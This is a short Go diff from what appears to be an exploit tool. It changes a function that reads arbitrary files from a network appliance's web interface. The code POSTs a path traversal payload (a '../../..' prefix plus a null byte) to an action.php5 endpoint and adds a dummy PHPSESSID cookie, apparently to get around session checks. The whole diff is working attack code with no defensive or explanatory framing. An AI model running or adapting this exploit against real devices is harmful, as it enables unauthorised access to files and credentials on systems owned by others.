@@ -259,9 +259,25 @@ func readPath(path string, port int) (s []string, err error) {
 	}
 	client := &http.Client{Transport: tr}
 
+	url := fmt.Sprintf("https://%s:%d/action.php5?_page=ActiveAPDetailInfoWebUI&_action=get&_dc=100000000", Address, port)
 	data := strings.NewReader("macAddr=../../.." + path + "%00")
 
-	resp, err := client.Post("https://"+Address+":"+strconv.Itoa(port)+"/action.php5?_page=ActiveAPDetailInfoWebUI&_action=get&name=bloop&debug=true", "application/x-www-form-urlencoded", data)
+	req, err := http.NewRequest("POST", url, data)
+	if err != nil {
+		fmt.Println(err)
+		return s, err
+	}
+
+	dummysession := &http.Cookie{
+		Name:   "PHPSESSID",
+		Value:  "a",
+		MaxAge: 300,
+	}
+
+	req.AddCookie(dummysession)
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println(err)
 		return s, err
